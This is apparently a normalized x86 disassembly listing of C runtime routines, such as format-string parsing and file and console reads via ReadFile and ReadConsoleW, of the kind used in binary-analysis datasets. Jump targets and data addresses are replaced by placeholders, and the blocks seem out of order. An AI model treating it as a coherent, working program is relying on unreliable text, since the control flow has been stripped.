mov [ ebp - 0x20 ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_42a772
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_42a9b8
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
pop ebp
retn
call sub_427b11
mov [ eax ] 0x16
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_433f4b
call sub_42a8bf
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
xor ecx ecx
mov [ esi ] cx
pop esi
pop ebp
retn
call sub_427b11
mov [ eax ] 0x22
jmp r-xdata
call sub_42a231
or eax 0xffffffff
sub_42aa2f
push ebp
mov ebp esp
sub esp 0x488
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x428 ] eax
xor eax eax
mov ebx eax
lea ecx [ ebp - 0x450 ]
mov [ ebp - 0x408 ] esi
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x440 ] eax
mov [ ebp - 0x430 ] eax
call sub_4247f2
call sub_427b11
mov [ ebp - 0x464 ] eax
cmp [ ebp - 0x428 ] ebx
jne r-xdata
test esi esi
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
cmp [ ebp - 0x444 ] bl
je r-xdata
xor ecx ecx
mov eax ecx
mov edx ecx
mov [ ebp - 0x434 ] ecx
mov [ ebp - 0x458 ] ecx
movzx ecx [ esi ]
mov [ ebp - 0x420 ] eax
mov [ ebp - 0x414 ] edx
mov [ ebp - 0x41c ] ecx
test cx cx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x448 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x444 ] 0x0
je r-xdata
mov esi [ ebp - 0x46c ]
mov [ ebp - 0x474 ] 0x58
mov [ ebp - 0x47c ] 0x64
mov [ ebp - 0x480 ] 0x69
mov [ ebp - 0x468 ] 0x6f
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
mov ecx [ ebp - 0x448 ]
and [ ecx + 0x70 ] 0xfffffffd
push 0x58
lea eax [ ecx - 0x20 ]
pop edi
cmp ax di
ja r-xdata
xor eax eax
movzx eax cx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov eax [ ebp - 0x408 ]
jmp [ eax * 4 + jump_table_42b62b ]
mov edi [ ebp - 0x434 ]
movsx edi [ edi + eax * 8 + r--data ]
mov eax edi
sar eax 0x4
mov [ ebp - 0x434 ] edi
mov edi [ ebp - 0x40c ]
mov [ ebp - 0x434 ] eax
cmp eax 0x7
ja r-xdata
add [ ebp - 0x408 ] 0x2
test eax eax
js r-xdata
xor eax eax
or [ ebp - 0x418 ] 0xffffffff
mov ebx eax
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x440 ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x430 ] eax
jmp r-xdata
movzx eax cx
push 0x20
pop ecx
sub eax ecx
je r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
xor eax eax
mov [ ebp - 0x418 ] eax
jmp r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
mov [ ebp - 0x430 ] 0x1
push ecx
call sub_434b9f
add esp 0xc
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
or ebx 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x424 ]
imul eax eax 0xa
mov [ ebp - 0x424 ] eax
movzx eax cx
mov ecx [ ebp - 0x424 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x424 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x424 ] eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x418 ]
imul eax eax 0xa
mov [ ebp - 0x418 ] eax
movzx eax cx
mov ecx [ ebp - 0x418 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x418 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] eax
test eax eax
mov eax [ ebp - 0x408 ]
mov [ ebp - 0x40c ] edi
jns r-xdata
mov eax [ ebp - 0x408 ]
movzx eax [ eax ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
mov edx [ ebp - 0x414 ]
cmp eax 0x70
jg r-xdata
je r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or ebx 0x4
neg eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
jmp r-xdata
movzx ecx [ eax ]
mov eax [ ebp - 0x420 ]
mov [ ebp - 0x41c ] ecx
test cx cx
jne r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x34
jne r-xdata
push 0x20
pop eax
or ebx eax
jmp r-xdata
push 0x6c
pop ecx
cmp eax ecx
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or ebx 0x40
mov [ ebp - 0x410 ] ebx
cmp eax 0x53
jg r-xdata
or ebx 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp ax [ ebp - 0x47c ]
je r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x32
jne r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
or ebx 0x8000
jmp r-xdata
mov eax [ ebp - 0x408 ]
cmp [ eax ] cx
jne r-xdata
cmp eax 0x77
mov eax [ ebp - 0x408 ]
jne r-xdata
mov eax [ ebp - 0x418 ]
mov edi 0x7fffffff
cmp eax 0xffffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x418 ] 0x8
cmp eax 0x65
jl r-xdata
mov ecx [ edi ]
add edi 0x8
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
jmp r-xdata
test ebx 0x1000
je r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or ebx 0x4
sub eax 0x3
mov eax [ ebp - 0x408 ]
jne r-xdata
cmp ax [ ebp - 0x480 ]
je r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
and ebx 0xffff7fff
jmp r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x10
jmp r-xdata
add eax 0x2
mov [ ebp - 0x408 ] eax
or ebx 0x1000
jmp r-xdata
or ebx 0x800
jmp r-xdata
mov esi [ ebp - 0x40c ]
add esi 0x4
mov [ ebp - 0x40c ] esi
mov esi [ esi - 0x4 ]
test bl 0x20
je r-xdata
mov edi eax
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
pop eax
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x41c ] 0x10
test bl bl
jns r-xdata
cmp [ ebp - 0x440 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
xor eax eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
test bl 0x20
je r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
test ebx 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or ebx 0x8
cmp ax [ ebp - 0x468 ]
je r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
push 0x27
test ebx 0x8000
jne r-xdata
push 0x30
pop ecx
add eax 0x51
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x42c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x458 ]
test eax eax
je r-xdata
test bl 0x40
je r-xdata
mov eax [ ebp - 0x418 ]
or ebx 0x40
mov edx 0x200
mov [ ebp - 0x410 ] ebx
lea esi [ ebp - 0x404 ]
mov [ ebp - 0x414 ] edx
test eax eax
jns r-xdata
push 0x69
pop ecx
cmp eax ecx
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
push 0x20
pop eax
add ecx eax
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x41c ] ecx
dec eax
dec eax
je r-xdata
cmp eax 0x75
je r-xdata
mov [ ebp - 0x430 ] 0x1
mov edx esi
test edi edi
je r-xdata
mov esi [ rw-data ]
xor ecx ecx
mov eax esi
mov edx ecx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
test edi edi
jle r-xdata
mov esi [ rw-data ]
push eax
call sub_422732
xor eax eax
pop ecx
mov [ ebp - 0x458 ] eax
push 0x20
pop ecx
test ebx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x418 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test ebx 0x9000
jne r-xdata
cmp edi eax
jg r-xdata
mov ecx [ edi - 0x4 ]
xor eax eax
mov edi eax
mov eax [ edi - 0x4 ]
movzx eax [ edi - 0x4 ]
jmp r-xdata
movsx eax [ edi - 0x4 ]
jmp r-xdata
mov esi [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
dec eax
dec eax
jne r-xdata
test ebx 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp eax 0x78
je r-xdata
sub edx esi
xor eax eax
mov al [ eax ]
test al al
je r-xdata
push [ ebp - 0x464 ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x438 ]
push eax
call sub_434c01
add esp 0x14
test bl 0x8
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push ecx
call sub_434bd5
mov eax [ ebp - 0x42c ]
add esp 0x10
test bl 0x1
je r-xdata
push 0x2d
cmp eax edx
jle r-xdata
push 0x67
pop eax
cmp cx ax
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x488 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x484 ] eax
lea eax [ ebp - 0x450 ]
push eax
push [ ebp - 0x460 ]
movsx eax cl
push [ ebp - 0x418 ]
mov [ ebp - 0x40c ] edi
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x488 ]
push esi
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
mov edi ebx
add esp 0x1c
and edi 0x80
je r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
call sub_423351
test eax eax
je r-xdata
push 0x6f
pop ecx
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x418 ]
test edx edx
jns r-xdata
mov edi eax
jl r-xdata
cdq
mov ecx eax
mov edi edx
mov [ ebp - 0x414 ] edx
test ebx 0x800
je r-xdata
movzx eax [ edi ]
add edi 0x4
mov [ ebp - 0x430 ] 0x1
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x45c ] eax
test bl 0x20
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp ax [ ebp - 0x474 ]
je r-xdata
add edx 0x2
test edi edi
jne r-xdata
lea ecx [ ebp - 0x450 ]
movzx eax al
push ecx
push eax
call sub_432c17
pop ecx
test eax eax
mov eax [ ebp - 0x41c ]
pop ecx
je r-xdata
cmp [ ebp - 0x430 ] 0x0
mov eax [ ebp - 0x414 ]
jne r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
push 0x2b
jmp r-xdata
cmp eax 0xa3
jle r-xdata
mov eax edx
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x418 ] 0x1
jmp r-xdata
push 0x67
pop eax
cmp [ ebp - 0x41c ] ax
jne r-xdata
cmp [ ebp - 0x418 ] 0x0
jne r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
cmp [ ebp - 0x444 ] 0x0
je r-xdata
mov eax [ ebp - 0x420 ]
test bl 0x20
je r-xdata
mov [ ebp - 0x41c ] 0x8
test bl bl
jns r-xdata
and ebx 0xfffffff7
mov [ ebp - 0x410 ] ebx
cmp edx 0x200
jle r-xdata
xor edx edx
inc edx
jmp r-xdata
neg ecx
adc edi eax
neg edi
or ebx 0x100
mov [ ebp - 0x410 ] ebx
cmp ecx eax
jae r-xdata
movsx edx [ eax ]
xor ecx ecx
mov [ ebp - 0x430 ] ecx
jmp r-xdata
movsx eax [ eax ]
cdq
sub eax edx
mov edx eax
mov [ ebp - 0x430 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x43c ] al
xor eax eax
mov [ ebp - 0x43b ] al
lea eax [ ebp - 0x450 ]
push eax
mov eax [ ebp - 0x450 ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_434dff
add esp 0x10
test eax eax
jns r-xdata
xor eax eax
mov [ ebp - 0x434 ] eax
dec edi
cmp [ edx ] ax
je r-xdata
mov edx [ ebp - 0x414 ]
inc eax
inc edx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
cmp edx edi
jl r-xdata
inc eax
push [ ebp - 0x464 ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
push esi
call sub_434c01
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x30
pop eax
push eax
call sub_434bd5
add esp 0x10
push 0x20
pop ecx
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x42c ] 0x1
lea edi [ eax + 0x15d ]
push edi
call sub_4266f1
pop ecx
mov ecx [ ebp - 0x41c ]
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x450 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov ecx [ ebp - 0x448 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov [ edi ] eax
mov [ edi ] ax
jmp r-xdata
or ebx 0x200
mov [ ebp - 0x410 ] ebx
jmp r-xdata
mov eax ecx
or eax edi
jne r-xdata
mov edx 0x200
sar edx 0x1
xor edx edx
lea esi [ ebp - 0x404 ]
inc edx
jmp r-xdata
mov [ ebp - 0x440 ] 0x1
jmp r-xdata
jmp r-xdata
test bl 0x4
je r-xdata
mov ecx esi
mov [ ebp - 0x41c ] esi
mov edi [ ebp - 0x424 ]
mov eax [ ebp - 0x42c ]
sub edi edx
sub edi eax
test bl 0xc
jne r-xdata
mov [ ebp - 0x418 ] 0xa3
mov esi eax
mov [ ebp - 0x414 ] edi
jmp r-xdata
push esi
call sub_425610
pop ecx
mov edx eax
jmp r-xdata
or ebx 0x100
mov [ ebp - 0x410 ] ebx
inc esi
jmp r-xdata
lea eax [ ebp - 0x450 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ ebp - 0x440 ] 0x1
jmp r-xdata
lea esi [ ebp - 0x205 ]
mov [ ebp - 0x42c ] eax
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x20
pop eax
push eax
call sub_434bd5
add esp 0x10
or eax 0xffffffff
mov [ ebp - 0x420 ] eax
jmp r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push [ ebp - 0x45c ]
call sub_434b9f
mov ecx [ ebp - 0x41c ]
add ecx [ ebp - 0x478 ]
mov eax [ ebp - 0x46c ]
add esp 0xc
mov [ ebp - 0x41c ] ecx
test eax eax
jg r-xdata
mov edi [ ebp - 0x40c ]
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ecx
call sub_434f10
add ecx 0x30
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x414 ] eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ecx
or eax edi
je r-xdata
test eax eax
js r-xdata
dec eax
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x450 ]
push eax
mov eax [ ebp - 0x450 ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x45c ]
push ecx
push eax
call sub_434dff
add esp 0x10
mov [ ebp - 0x478 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov edx [ ebp - 0x418 ]
mov [ esi ] cl
mov ecx [ ebp - 0x414 ]
dec esi
jmp r-xdata
add ecx [ ebp - 0x454 ]
mov ebx [ ebp - 0x410 ]
lea edx [ ebp - 0x205 ]
sub edx esi
inc esi
mov [ ebp - 0x414 ] edx
test ebx 0x200
je r-xdata
mov eax [ ebp - 0x420 ]
mov eax edx
dec edx
mov [ ebp - 0x418 ] edx
test eax eax
jg r-xdata
test edx edx
je r-xdata
dec esi
push 0x30
pop eax
mov [ esi ] al
inc edx
jmp r-xdata
cmp [ esi ] 0x30
je r-xdata
sub_42b64b
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
mov eax [ edi + 0xc ]
test al 0x83
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ edi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ edi + 0x8 ]
mov [ edi ] eax
push edi
call sub_42eb5f
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ edi + 0xc ] eax
and [ edi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ edi + 0x18 ]
push [ edi + 0x8 ]
push edi
call sub_42b76c
pop ecx
push eax
call sub_42b790
add esp 0xc
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
test [ edi + 0xc ] 0x82
jne r-xdata
cmp [ edi + 0x18 ] 0x200
jne r-xdata
push edi
call sub_42b76c
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ edi ]
dec [ edi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ edi ] ecx
jmp r-xdata
test [ edi + 0xc ] 0x8
je r-xdata
mov eax rw-data
push edi
call sub_42b76c
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop ebp
retn
test [ edi + 0xc ] 0x400
jne r-xdata
or [ edi + 0xc ] 0x2000
push esi
push edi
call sub_42b76c
mov esi eax
push edi
sar esi 0x5
call sub_42b76c
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
pop esi
jmp r-xdata
mov [ edi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_42b76c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
pop ebp
retn
sub_42b790
push 0x10
push r--data
call sub_429ad0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_427add
and [ eax ] 0x0
call sub_427b11
mov [ eax ] 0x9
jmp r-xdata
call sub_427add
and [ eax ] 0x0
call sub_427b11
mov [ eax ] 0x9
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push esi
call sub_434fa5
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_427add
and [ eax ] 0x0
call sub_427b11
mov [ eax ] 0x16
jmp r-xdata
call sub_427b11
mov [ eax ] 0x9
call sub_427add
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_42b898
add esp 0xc
mov edi eax
jmp r-xdata
call sub_42a231
call sub_429b15
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b86f
mov eax edi
jmp r-xdata
sub_42b898
push ebp
mov ebp esp
sub esp 0x28
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
push 0xfffffffe
pop ecx
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x28 ] esi
cmp eax ecx
jne r-xdata
test eax eax
js r-xdata
call sub_427add
mov [ eax ] edi
call sub_427b11
mov [ eax ] 0x9
jmp r-xdata
call sub_427add
mov [ eax ] edi
call sub_427b11
mov [ eax ] 0x9
cmp eax [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ecx eax
sar ecx 0x5
mov ebx eax
mov edx [ ecx * 4 + rw-data ]
and ebx 0x1f
shl ebx 0x6
mov [ ebp - 0xc ] ecx
mov al [ edx + ebx + 0x4 ]
mov [ ebp - 0x24 ] ebx
test al 0x1
je r-xdata
cmp esi 0x7fffffff
jbe r-xdata
test esi esi
je r-xdata
call sub_427add
mov [ eax ] edi
xor eax eax
jmp r-xdata
test al 0x2
jne r-xdata
call sub_42a231
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] edi
jne r-xdata
mov al [ edx + ebx + 0x24 ]
add al al
sar al 0x1
mov [ ebp + 0x13 ] al
movsx eax al
dec eax
je r-xdata
call sub_427add
and [ eax ] edi
jmp r-xdata
mov eax esi
not eax
test al 0x1
je r-xdata
dec eax
jne r-xdata
call sub_427b11
mov [ eax ] 0x16
jmp r-xdata
shr esi 0x1
cmp esi 0x4
jae r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax esi
not eax
test al 0x1
je r-xdata
push esi
call sub_4266f1
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
push 0x4
pop esi
mov edx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0xc ]
test [ edx + ebx + 0x4 ] 0x48
mov [ ebp - 0x1c ] eax
je r-xdata
and esi 0xfffffffe
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_42cb83
mov ecx [ ebp - 0xc ]
add esp 0x10
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + ebx + 0x28 ] eax
mov eax [ ebp - 0x10 ]
mov [ ecx + ebx + 0x2c ] edx
mov ecx [ ebp - 0xc ]
call sub_427b11
mov [ eax ] 0xc
call sub_427add
mov [ eax ] 0x8
jmp r-xdata
push [ ebp + 0x8 ]
call sub_433ef7
test eax eax
mov eax [ ebp - 0xc ]
pop ecx
je r-xdata
mov dl [ edx + ebx + 0x5 ]
cmp dl 0xa
je r-xdata
mov eax [ eax * 4 + rw-data ]
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
push esi
push [ ebp - 0x1c ]
push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
test [ ecx + ebx + 0x4 ] 0x80
je r-xdata
test esi esi
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x14 ]
test ecx ecx
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push [ ecx + ebx ]
call [ GetConsoleMode@IAT ]
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ eax ] dl
xor edi edi
lea edx [ eax + 0x1 ]
mov eax [ ecx * 4 + rw-data ]
inc edi
dec esi
cmp [ ebp + 0x13 ] 0x0
mov [ ebp - 0x1c ] edx
mov [ eax + ebx + 0x5 ] 0xa
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_427b11
mov [ eax ] 0x9
call sub_427add
mov [ eax ] esi
jmp r-xdata
cmp ecx esi
ja r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x13 ] 0x2
jne r-xdata
mov eax [ ecx * 4 + rw-data ]
mov al [ eax + ebx + 0x25 ]
cmp al 0xa
je r-xdata
push eax
call sub_427af0
pop ecx
xor ebx ebx
jmp r-xdata
or ebx 0xffffffff
mov edx [ ebp - 0xc ]
add edi ecx
mov esi [ edx * 4 + rw-data ]
mov al [ esi + ebx + 0x4 ]
test al al
jns r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
shr esi 0x1
mov eax [ eax * 4 + rw-data ]
push esi
push [ ebp - 0x1c ]
push [ eax + ebx ]
call [ ReadConsoleW@IAT ]
test eax eax
jne r-xdata
test esi esi
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x13 ] 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
lea ecx [ eax + eax ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ edx ] al
mov eax [ ecx * 4 + rw-data ]
inc edx
push 0x2
dec esi
cmp [ ebp + 0x13 ] 0x1
mov [ ebp - 0x1c ] edx
pop edi
mov [ eax + ebx + 0x25 ] 0xa
jne r-xdata
cmp ebx 0xfffffffe
je r-xdata
push eax
call sub_422732
pop ecx
cmp [ ebp - 0x20 ] 0x0
je r-xdata
test ecx ecx
je r-xdata
mov eax [ ecx * 4 + rw-data ]
mov al [ eax + ebx + 0x26 ]
cmp al 0xa
je r-xdata
mov eax edi
jmp r-xdata
mov edi ebx
test ecx ecx
je r-xdata
mov esi [ ebp - 0x10 ]
mov eax edi
cdq
sub eax edx
sar eax 0x1
mov edi esi
mov ecx esi
lea edx [ edi + eax * 2 ]
cmp edi edx
jae r-xdata
and al 0xfb
mov ecx [ ebp - 0x10 ]
cmp [ ecx ] 0xa
jne r-xdata
test esi esi
je r-xdata
and al 0xfb
mov ecx [ ebp - 0x10 ]
push 0xa
pop edx
cmp [ ecx ] dx
mov edx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edi esi
sub edi eax
and edi 0xfffffffe
jmp r-xdata
push 0xd
mov [ ebp + 0x10 ] 0x1a
pop edi
mov eax [ ebp - 0x10 ]
mov edi esi
sub edi eax
cmp [ ebp + 0x13 ] 0x1
jne r-xdata
push 0xd
pop ecx
mov edi eax
or al 0x4
jmp r-xdata
push 0x3
pop edi
mov [ edx ] al
mov eax [ ecx * 4 + rw-data ]
push 0xa
inc edx
pop ecx
mov [ ebp - 0x1c ] edx
dec esi
mov [ eax + ebx + 0x26 ] cl
mov eax [ ebp - 0x10 ]
mov edi esi
sub edi eax
jmp r-xdata
push 0xd
pop ecx
mov [ ebp + 0x10 ] 0x1a
mov edi eax
or al 0x4
jmp r-xdata
mov ebx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
mov eax [ eax * 4 + rw-data ]
or [ eax + ebx + 0x4 ] 0x2
cmp ax di
je r-xdata
test edi edi
je r-xdata
mov ecx [ edx * 4 + rw-data ]
mov al [ ecx + ebx + 0x4 ]
test al 0x40
jne r-xdata
cmp al cl
je r-xdata
mov [ esi + ebx + 0x4 ] al
mov eax [ ebp - 0x10 ]
mov esi eax
lea ecx [ eax + edi ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ecx
cmp eax ecx
jae r-xdata
mov ecx [ edx * 4 + rw-data ]
mov al [ ecx + ebx + 0x4 ]
test al 0x40
jne r-xdata
cmp ax cx
je r-xdata
mov [ esi + ebx + 0x4 ] al
mov eax [ ebp - 0x10 ]
mov esi eax
lea ecx [ eax + edi ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x20 ] ecx
cmp eax ecx
jae r-xdata
lea eax [ edx - 0x2 ]
cmp ecx eax
jae r-xdata
mov [ esi ] ax
add esi 0x2
add ecx 0x2
jmp r-xdata
dec esi
mov al [ esi ]
test al al
js r-xdata
mov al [ edi ]
mov [ esi ] al
inc esi
or al 0x2
mov [ ecx + ebx + 0x4 ] al
jmp r-xdata
mov eax [ ebp - 0x1c ]
dec eax
cmp edi eax
jae r-xdata
mov [ esi ] al
inc esi
inc edi
jmp r-xdata
